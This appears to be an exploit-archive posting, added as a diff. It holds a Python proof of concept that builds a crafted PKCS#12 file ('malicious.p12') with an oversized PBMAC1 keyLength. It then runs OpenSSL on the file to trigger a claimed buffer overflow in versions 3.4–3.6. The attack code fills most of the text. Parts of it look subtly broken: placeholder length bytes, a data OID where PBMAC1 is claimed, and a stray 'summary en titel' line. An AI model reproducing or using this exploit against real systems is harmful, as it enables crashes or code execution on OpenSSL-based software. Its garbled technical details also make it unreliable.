@@ -1,0 +1,127 @@
+=============================================================================================================================================
+| # Title     : OpenSSL 3.x PKCS#12 PBMAC1 KeyLength Buffer Overflow                                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.openssl-library.org/                                                                                            |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214422/ & 	CVE-2025-11187, CVE-2025-15467, CVE-2025-15468, CVE-2025-15469, CVE-2025-66199, 
+                                                                CVE-2025-68160, CVE-2025-69418, CVE-2025-69419, CVE-2025-69420, CVE-2025-69421, 
+																CVE-2026-22795, CVE-2026-22796
+
+[+] Summary    :  This Proof of Concept demonstrates a buffer overflow vulnerability in OpenSSL versions 3.4 to 3.6 related to improper handling of the PBMAC1 keyLength parameter in PKCS#12 files.
+                  By crafting a malicious PKCS#12 structure with an excessively large keyLength value, the PoC triggers a memory overflow in the MAC processing logic, 
+				  potentially leading to a segmentation fault and, under certain conditions, remote code execution (RCE).
+                  The exploit works by abusing ASN.1-encoded PBMAC1 parameters, specifically exceeding the expected 64‑byte buffer used internally by OpenSSL. 
+				  When the generated malicious.p12 file is parsed using the openssl pkcs12 command, vulnerable versions may crash or hang, indicating successful triggering of the flaw.
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import struct
+import os
+from hashlib import sha256
+
+def create_malicious_pkcs12():
+
+    pkcs12_template = bytes([
+
+        0x30, 0x82, 0xFF, 0xFF,  
+
+        0x02, 0x01, 0x03,
+
+        0x30, 0x82, 0xFF, 0xFF,
+
+        0x30, 0x82, 0xFF, 0xFF,
+        0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x01, 
+        0xA0, 0x82, 0xFF, 0xFF,
+
+        0xA0, 0x82, 0xFF, 0xFF,
+        0x04, 0x82, 0xFF, 0xFF, 
+    ])
+
+    macdata = bytearray()
+
+    macdata.extend(b'\x30\x82\xFF\xFF')  
+
+    macdata.extend(b'\x30\x0D')
+    macdata.extend(b'\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x01') 
+    macdata.extend(b'\x05\x00')
+
+    macdata.extend(b'\x04\x20')  
+    macdata.extend(os.urandom(32))
+
+    macdata.extend(b'\x02\x04\x00\x00\x27\x10')  # 10000 iterations
+    macdata.extend(b'\x30\x82\xFF\xFF')  
+
+    macdata.extend(b'\x02\x04')  
+    keylength = 1000 
+    macdata.extend(struct.pack('>I', keylength))
+    macdata.extend(b'\x30\x0C')
+    macdata.extend(b'\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x01') 
+    macdata.extend(b'\x05\x00')
+    output = bytearray(pkcs12_template)
+    fake_data = b'\x00' * 100
+    output.extend(fake_data)
+    macdata_pos = len(output)
+    output.extend(macdata)
+    def set_length(data, pos, length):
+        if length < 128:
+            data[pos] = 0x80 + 1
+            data[pos+1] = length
+            return 2
+        else:
+            len_bytes = (length.bit_length() + 7) // 8
+            data[pos] = 0x80 + len_bytes + 1
+            data[pos+1] = 0x80 + len_bytes
+            for i in range(len_bytes):
+                data[pos+2+i] = (length >> (8*(len_bytes-1-i))) & 0xFF
+            return len_bytes + 2
+    macdata_len = len(macdata) - 4  # Minus the SEQUENCE header
+    len_bytes = set_length(output, macdata_pos + 1, macdata_len)
+    with open('malicious.p12', 'wb') as f:
+        f.write(output)
+    
+    print("[+] Created malicious PKCS#12 file: malicious.p12")
+    print(f"[+] KeyLength parameter: {keylength} bytes (buffer is 64 bytes)")
+    print("[!] When opened with: openssl pkcs12 -info -in malicious.p12")
+
+def test_with_openssl():
+
+    import subprocess
+    
+    print("\n[*] Testing with OpenSSL...")
+    try:
+        result = subprocess.run(
+            ['openssl', 'pkcs12', '-info', '-in', 'malicious.p12', '-passin', 'pass:'],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        print(f"Return code: {result.returncode}")
+        if "Segmentation fault" in result.stderr or "buffer overflow" in result.stderr:
+            print("[+] Vulnerability triggered!")
+        elif result.returncode != 0:
+            print(f"[!] OpenSSL crashed with: {result.stderr[:200]}")
+        else:
+            print("[-] No crash - maybe patched or wrong OpenSSL version")
+    except subprocess.TimeoutExpired:
+        print("[+] OpenSSL appears to have hung/crashed")
+    except FileNotFoundError:
+        print("[-] OpenSSL not found in PATH")
+
+if __name__ == "__main__":
+    print("=== CVE-2025-11187 PoC - PKCS#12 PBMAC1 Buffer Overflow ===\n")
+    create_malicious_pkcs12()
+    test_with_openssl()
+    
+    print("\n[*] For manual testing:")
+    print("    $ openssl pkcs12 -info -in malicious.p12 -noout")
+    print("    Expected: segmentation fault or buffer overflow detection")
+
+summary en titel
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
